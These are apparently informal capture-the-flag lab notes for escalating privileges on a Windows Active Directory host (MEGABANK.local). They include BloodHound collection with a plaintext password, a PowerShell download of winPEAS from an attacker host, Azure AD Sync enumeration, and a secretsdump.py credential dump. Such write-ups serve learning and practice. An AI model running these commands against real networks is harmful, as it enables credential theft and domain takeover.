
It's time for Bloodhound and Winpeas

Bloodhound
```
bloodhound-python -d MEGABANK.local -u mhope -p '4n0therD4y@n0th3r$' -ns 10.10.10.172 -c all
```

![[Pasted image 20240504002952.png]]

Started the Neo4j console and Run bloodhound


```
IWR -Uri http://10.10.16.20:8080//winpeas/winPEASx64.exe -OutFile winPEASx64.exe
```
![[Pasted image 20240504003704.png]]

Systeminfo
![[Pasted image 20240504013037.png]]

```
USERDOMAIN: MEGABANK
USERDNSDOMAIN: MEGABANK.LOCAL
```

![[Pasted image 20240504014452.png]]

If you recall that we have seen this account user name starting with AAD_ is used for actual sync service.
https://docs.microsoft.com/en-us/azure/active-directory/hybrid/concept-adsync-service-account

![[Pasted image 20240505041831.png]]

![[Pasted image 20240505041255.png]]


AD Sync 
![[Pasted image 20240505041505.png]]
So we see a Microsoft Azure AD Sync Folder 

We can enumerate the service instance using the Registry.
```
Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync
```
![[Pasted image 20240505041916.png]]


```
Get-ItemProperty -Path "C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe" | Format-list -Property * -Force
```
![[Pasted image 20240505043207.png]]

First i tried running this to know if it working cuz the tools we are going to use will extract the password dump from the AD as it's using DPAPI

```
secretsdump.py MEGABANK.LOCAL/mhope:'4n0therD4y@n0th3r$'@10.10.10.172 -use-vss
```
![[Pasted image 20240505042603.png]]

https://github.com/dirkjanm/adconnectdump
https://blog.xpnsec.com/azuread-connect-for-redteam/
If i recall it correct we have also used another tool written by this fella. (i.e. ldapdomain dump)

